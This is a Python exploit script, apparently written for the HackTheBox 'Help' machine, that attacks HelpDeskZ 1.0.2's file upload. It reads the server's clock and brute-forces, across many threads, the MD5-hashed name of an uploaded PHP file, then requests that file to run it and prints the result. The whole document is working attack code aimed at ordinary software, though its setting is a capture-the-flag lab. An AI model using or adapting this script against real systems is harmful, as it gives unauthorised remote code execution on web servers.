# Inspiration of exploit script taken from: https://github.com/JubJubMcGrub/HelpDeskZ-1.0.2-File-Uplaod/blob/master/helpdeskz.py

import requests
import hashlib
import threading
import os
from email.utils import parsedate_to_datetime

FILENAME = "solopie.php"

def execute_payload(server_epoch_time, offset):
    # md5 the time and test if file exists
    md5sum = hashlib.md5(FILENAME.encode() + str(server_epoch_time + offset).encode()).hexdigest()
    
    # Test if the PHP file exists
    r = requests.get(f"http://help.htb/support/uploads/tickets/{md5sum}.php")
    if r.status_code != 404:
        print("[SUCCESS] PHP code was found and executed!")
        print(f"[INFO] Time offset: {offset}")
        print(f"[INFO] http://help.htb/support/uploads/tickets/{md5sum}.php")
        print(r.text)
        os._exit(0)

if __name__ == "__main__":
    input(f"[ALERT] Upload {FILENAME} file now! Press enter to attempt to execute the payload")
    
    # Get the time of the server
    r = requests.get("http://help.htb/support/")
    server_epoch_time = int(parsedate_to_datetime(r.headers["Date"]).timestamp())
    
    print(f"[INFO] Looking for {FILENAME} file...")
    
    # Iterate through range of numbers "-60 < curtime < +60"
    offset = 20
    threads = []
    for cur_offset in range(offset*-1, offset):
        t = threading.Thread(target=execute_payload, args=(server_epoch_time, cur_offset,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
    
    print("[FAIL] PHP file was not found")
    

